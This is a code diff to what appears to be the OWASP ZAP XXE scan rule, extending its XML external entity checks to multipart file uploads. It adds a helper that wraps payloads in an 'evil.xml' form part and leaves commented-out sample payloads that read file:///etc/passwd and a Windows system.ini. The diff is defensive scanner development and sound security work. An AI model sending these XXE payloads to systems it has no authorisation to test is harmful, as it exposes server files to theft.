@@ -42,6 +42,9 @@ import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerabilities;
 import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerability;
 import org.zaproxy.addon.oast.ExtensionOast;
 
+//added
+import org.parosproxy.paros.network.HttpRequestHeader;
+
 /**
  * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  *
@@ -180,18 +183,24 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
      */
     @Override
     public void scan() {
+        LOGGER.warn("Starting Scan");
         // Prepare the message
         HttpMessage msg = getBaseMsg();
         String contentType = msg.getRequestHeader().getHeader(HttpFieldsNames.CONTENT_TYPE);
 
         // first check if it's an XML otherwise it's useless...
-        if ((contentType != null) && (contentType.contains("xml"))) {
+        if ((contentType != null) && (((contentType.contains("xml")) || (contentType.contains("multipart"))))) {
+            
+            Boolean MultipartFlag= false;
+            if (contentType.contains("multipart")){
+                MultipartFlag=true;
+            }
 
             // Check #1 : XXE Remote File Inclusion Attack
-            remoteFileInclusionAttack();
+            remoteFileInclusionAttack(MultipartFlag);
 
             // Check #2 : Out-of-band XXE Attack
-            outOfBandFileInclusionAttack();
+            outOfBandFileInclusionAttack(MultipartFlag);
 
             // Check if we've to do only basic analysis (only remote should be done)...
             if (this.getAttackStrength() == AttackStrength.LOW) {
@@ -199,7 +208,7 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
             }
 
             // Check #3 : XXE Local File Reflection Attack
-            localFileReflectionAttack(getNewMsg());
+            localFileReflectionAttack(getNewMsg(),MultipartFlag);
 
             // Check if we've to do only medium sized analysis
             // (only remote and reflected will be done)
@@ -213,8 +222,42 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
             }
 
             // Check #4 : XXE Local File Inclusion Attack
-            localFileInclusionAttack(getNewMsg());
+            localFileInclusionAttack(getNewMsg(),MultipartFlag);
         }
+        // LOGGER.warn("Not content-type: XML");
+        // if ((contentType != null) && (contentType.contains("multipart"))) {
+        //     try {
+        //         //update header
+        //         HttpRequestHeader reqHeader = msg.getRequestHeader();
+        //         reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b77183599999999999999999999");
+        //         msg.setRequestHeader(reqHeader);
+        //         // String newType = msg.getRequestHeader().getHeader(HttpFieldsNames.CONTENT_TYPE);
+
+        //         //update body
+        //         //String strBody = msg.getRequestBody().toString();
+        //         String strBody="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
+        //         + "<!DOCTYPE foo [\n"
+        //         + "  <!ELEMENT foo ANY >\n"
+        //         + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
+        //         + "]>\n";
+        //         String start="----geckoformboundarye2752d82dc2e1a3977363a4b77183599999999999999999999\n"
+        //         + "Content-Disposition: form-data; name=\"file\"; filename=\"Malicious.xml\"\n"
+        //         + "Content-Type: application/xml\r\n\r\n";
+        //         String end="----geckoformboundarye2752d82dc2e1a3977363a4b77183599999999999999999999--\r\n" + //
+        //                 "";
+        //         // strBody=start+strBody+end;
+        //         strBody=start+"\r\n"+end;
+
+        //         msg.setRequestBody(strBody);
+
+        //         sendAndReceive(msg);
+
+        //         LOGGER.warn("edited content type.");
+
+        //     } catch (Exception e) {
+        //         LOGGER.warn("You messed up Ryan. Bad Ryan", e);
+        //     }
+        // }
     }
 
     /**
@@ -223,7 +266,7 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
      * external bouncing site, in this case we use the ZAP API as a server for the vulnerability
      * check using a challenge/response model based on a random string
      */
-    private void remoteFileInclusionAttack() {
+    private void remoteFileInclusionAttack(Boolean MultipartFlag) {
         try {
             ExtensionOast extOast =
                     Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
@@ -239,6 +282,15 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
                         extOast.registerAlertAndGetPayloadForCallbackService(
                                 alert, XxeScanRule.class.getSimpleName());
                 String payload = MessageFormat.format(ATTACK_MESSAGE, callbackPayload);
+
+                if (MultipartFlag==true){
+                    HttpRequestHeader reqHeader = msg.getRequestHeader();
+                    reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b771835");
+                    msg.setRequestHeader(reqHeader);
+
+                    payload=setMultipartFormData(payload);
+                }
+
                 alert.setAttack(payload);
                 msg.setRequestBody(payload);
                 sendAndReceive(msg);
@@ -248,7 +300,7 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
         }
     }
 
-    private void outOfBandFileInclusionAttack() {
+    private void outOfBandFileInclusionAttack(Boolean MultipartFlag) {
         try {
             ExtensionOast extOast =
                     Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
@@ -262,12 +314,30 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
                                 .build();
                 String oastPayload = extOast.registerAlertAndGetPayload(alert);
                 String payload = MessageFormat.format(ATTACK_MESSAGE, "http://" + oastPayload);
+                
+                if (MultipartFlag==true){
+                    HttpRequestHeader reqHeader = msg.getRequestHeader();
+                    reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b771835");
+                    msg.setRequestHeader(reqHeader);
+
+                    payload=setMultipartFormData(payload);
+                }
+
                 alert.setAttack(payload);
                 msg.setRequestBody(payload);
                 sendAndReceive(msg);
                 // Try again with https
                 msg = getNewMsg();
                 payload = MessageFormat.format(ATTACK_MESSAGE, "https://" + oastPayload);
+                
+                if (MultipartFlag==true){
+                    HttpRequestHeader reqHeader = msg.getRequestHeader();
+                    reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b771835");
+                    msg.setRequestHeader(reqHeader);
+
+                    payload=setMultipartFormData(payload);
+                }
+
                 msg.setRequestBody(payload);
                 sendAndReceive(msg);
             }
@@ -287,11 +357,11 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
      * @param msg new HttpMessage with the same request as the base. This is used to build the
      *     attack payload.
      */
-    private void localFileReflectionAttack(HttpMessage msg) {
+    private void localFileReflectionAttack(HttpMessage msg, Boolean MultipartFlag) {
         // First replace the values in all the Elements by the Attack Entity
         String originalRequestBody = msg.getRequestBody().toString();
         String requestBody = createLfrPayload(originalRequestBody);
-        if (localFileReflectionTest(msg, requestBody)) {
+        if (localFileReflectionTest(msg, requestBody,MultipartFlag)) {
             return;
         }
         // Now if no issue is found yet, then we replace the values one at a time. Do this for a
@@ -312,7 +382,7 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
         Matcher tagMatcher = tagPattern.matcher(headerlessRequestBody);
         for (int tagIdx = 1; (tagIdx <= maxValuesChanged) && tagMatcher.find(); tagIdx++) {
             requestBody = createTagSpecificLfrPayload(headerlessRequestBody, tagMatcher);
-            if (localFileReflectionTest(msg, requestBody)) {
+            if (localFileReflectionTest(msg, requestBody,MultipartFlag)) {
                 return;
             }
         }
@@ -332,12 +402,21 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
      * @param msg new HttpMessage with the same request as the base. This is used to build the
      *     attack payload.
      */
-    private void localFileInclusionAttack(HttpMessage msg) {
+    private void localFileInclusionAttack(HttpMessage msg, Boolean MultipartFlag) {
         String payload = null;
         try {
             for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                 String localFile = LOCAL_FILE_TARGETS[idx];
                 payload = MessageFormat.format(ATTACK_MESSAGE, localFile);
+                
+                if (MultipartFlag==true){
+                    HttpRequestHeader reqHeader = msg.getRequestHeader();
+                    reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b771835");
+                    msg.setRequestHeader(reqHeader);
+
+                    payload=setMultipartFormData(payload);
+                }
+
                 msg.setRequestBody(payload);
                 sendAndReceive(msg);
                 String response = msg.getResponseBody().toString();
@@ -379,10 +458,20 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
         return sb.toString();
     }
 
-    private boolean localFileReflectionTest(HttpMessage msg, String requestBody) {
+    private boolean localFileReflectionTest(HttpMessage msg, String requestBody, Boolean MultipartFlag) {
         for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
             String localFile = LOCAL_FILE_TARGETS[idx];
             String payload = MessageFormat.format(requestBody, localFile);
+            
+            if (MultipartFlag==true){
+                HttpRequestHeader reqHeader = msg.getRequestHeader();
+                //-------------------------geckoformboundarye2752d82dc2e1a3977363a4b771835999999999999999999999999999
+                reqHeader.setHeader("Content-Type", "multipart/form-data; boundary=----geckoformboundarye2752d82dc2e1a3977363a4b771835");
+                msg.setRequestHeader(reqHeader);
+
+                payload=setMultipartFormData(payload);
+            }
+
             msg.setRequestBody(payload);
             try {
                 sendAndReceive(msg);
@@ -420,6 +509,48 @@ public class XxeScanRule extends AbstractAppPlugin implements CommonActiveScanRu
                 .setAttack(attack)
                 .setEvidence(evidence);
     }
+
+    private String setMultipartFormData(String payload){
+        String CRLF = "\r\n";
+        String start="----geckoformboundarye2752d82dc2e1a3977363a4b771835\r\n" + 
+        "Content-Disposition: form-data; name=\"file\"; filename=\"evil.xml\"\r\n" + 
+        "Content-Type: xml\r\n" + 
+        "\r\n";
+        String end="----geckoformboundarye2752d82dc2e1a3977363a4b771835--\r\n";
+        //payload=start+payload+"\n"+"\r\n"+end;
+        payload= CRLF +
+        "------geckoformboundarye2752d82dc2e1a3977363a4b771835" + CRLF +
+                "Content-Disposition: form-data; name=\"file\"; filename=\"evil.xml\"" + CRLF +
+                "Content-Type: xml" + CRLF +
+                CRLF +
+                payload +
+                CRLF +
+                "------geckoformboundarye2752d82dc2e1a3977363a4b771835--" + CRLF;
+        return payload;
+    }
+
+
+    // String example="-----------------------------154958992842076507891505131772\r\n" + 
+    //     "Content-Disposition: form-data; name=\"file\"; filename=\"simpleMalitiouse.xml.zip\"\r\n" + 
+    //     "Content-Type: application/zip\r\n" + 
+    //     "\r\n" + 
+    //     "<?xml version=\"1.0\" standalone=\"yes\"?>\n" + 
+    //     "<!DOCTYPE foo [<!ELEMENT foo ANY >\n" + 
+    //     "    <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n" + 
+    //     "<foo> &xxe; </foo>\n" + 
+    //     "\r\n" +
+    //     "-----------------------------154958992842076507891505131772--\r\n";
+
+    // String example="Content-Type: application/zip\r\n" + //
+    //         "\r\n" + //
+    //         "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" + //
+    //         "<!DOCTYPE foo [\n" + //
+    //         "  <!ELEMENT foo ANY >\n" + //
+    //         "  <!ENTITY zapxxe SYSTEM \"file:///d:/Windows/system.ini\">\n" + //
+    //         "]>\n" + //
+    //         "<foo>&zapxxe;</foo>\r\n" + //
+    //         "------------9--\r\n" + //
+    //         "";
 
     @Override
     public List<Alert> getExampleAlerts() {
